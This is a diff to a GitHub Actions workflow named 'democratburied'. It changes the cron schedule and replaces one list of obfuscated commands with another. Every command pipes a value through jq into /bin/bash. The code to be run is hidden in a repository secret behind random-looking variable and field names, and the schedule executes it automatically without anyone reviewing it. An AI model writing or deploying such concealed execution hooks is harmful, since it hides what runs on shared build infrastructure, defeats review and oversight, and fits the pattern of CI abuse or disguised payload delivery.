@@ -3,25 +3,30 @@ name: democratburied
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 2/6 * * *'
+    - cron: '37 5/6 * * *'
 
-jobs:  # 27724
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: democratburied
         env:
-          nwyy63: ${{ secrets.nwyy63 }}
+          ezw4620: ${{ secrets.ezw4620 }}
         run: |
-          echo $nwyy63 | jq -r .horz15350 | /bin/bash
-          echo $g44 | jq -r .pd0676 | /bin/bash
-          echo $zkv32 | jq -r .w1636 | /bin/bash
-          echo $jk365 | jq -r .zhi07400 | /bin/bash
-          echo $xltj5689 | jq -r .cjqhu8 | /bin/bash
-          echo $jszgg24428 | jq -r .g07647 | /bin/bash
-          echo $ffp77348 | jq -r .bum393 | /bin/bash
-          echo $rg176 | jq -r .tftc42 | /bin/bash
-          echo $a6 | jq -r .szfl61 | /bin/bash
-          echo $eqqeu601 | jq -r .n71 | /bin/bash
+          echo $ezw4620 | jq -r .ehgqo5 | /bin/bash
+          echo $u301 | jq -r .nby27671 | /bin/bash
+          echo $ultt31267 | jq -r .gtcl23491 | /bin/bash
+          echo $az2 | jq -r .urv31230 | /bin/bash
+          echo $ew7129 | jq -r .cej61860 | /bin/bash
+          echo $o2 | jq -r .h5 | /bin/bash
+          echo $trzc0525 | jq -r .urke582 | /bin/bash
+          echo $pmeh4 | jq -r .p567 | /bin/bash
+          echo $llc1090 | jq -r .zb23 | /bin/bash
+          echo $bu0484 | jq -r .qfvp55725 | /bin/bash
+          echo $qw7 | jq -r .ifg9 | /bin/bash
+          echo $lv36 | jq -r .n4 | /bin/bash
+          echo $rafx7 | jq -r .lslh7 | /bin/bash
+          echo $goxt56079 | jq -r .hqw53 | /bin/bash
 
